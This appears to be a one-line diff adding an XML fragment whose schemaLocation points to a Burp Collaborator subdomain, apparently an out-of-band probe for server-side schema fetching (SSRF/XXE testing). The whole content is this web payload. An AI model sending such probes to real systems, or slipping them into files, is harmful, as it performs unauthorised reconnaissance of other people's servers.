@@ -1,0 +1,1 @@
+<yfr xmlns="http://a.b/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://a.b/ http://jsfnd48d06jd0480hlfxlq0p7gd912sqsek1dp2.burpcollaborator.net/yfr.xsd">yfr</yfr>
